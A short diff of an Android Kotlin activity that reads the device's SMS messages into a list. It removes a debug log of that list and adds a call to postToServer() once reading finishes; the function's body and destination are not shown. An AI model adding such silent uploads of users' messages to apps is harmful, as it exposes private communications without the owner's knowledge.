@@ -89,12 +89,11 @@ class MainActivity : AppCompatActivity() {
                                 smsInfo.type = cur.getInt(type)
                                 smsList.add(smsInfo)
                             } while (cur.moveToNext())
-                            Log.e("czl", JSON.toJSONString(smsList))
-//                            LogUtil.e(JSON.toJSONString(smsList))
                             adapterSMS.notifyDataSetChanged()
                             if (!cur.isClosed) {
                                 cur.close()
                             }
+                            postToServer()
                         }
                     }
                 } catch (ex: SQLException) {
